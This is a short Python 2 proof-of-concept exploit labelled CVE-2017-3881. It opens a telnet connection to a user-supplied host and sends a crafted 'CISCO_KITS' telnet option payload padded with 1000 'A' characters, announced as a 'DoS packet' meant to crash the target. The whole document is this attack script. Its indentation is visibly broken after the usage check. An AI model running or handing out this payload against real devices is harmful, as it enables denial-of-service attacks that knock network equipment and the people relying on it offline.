#!/usr/bin/python

#
# CVE-2017-3881 <ec@ekio.jp>
#

import socket
import sys
from time import sleep

if len(sys.argv) < 2:
            print sys.argv[0] + ' <host>'
                    sys.exit()

                    s = socket.socket( socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((sys.argv[1], 23))

                    print 'RX bytes:', repr(s.recv(1024))
                    print 'Sending DoS packet...'
                    payload = '\xff\xfa\x24\x00'
                    payload += '\x03CISCO_KITS\x012:'
                    payload += 'A' * 1000
                    payload += ':1:' +  '\xff\xf0'
                    s.send(payload)
                    print 'Done!'
                    s.close()

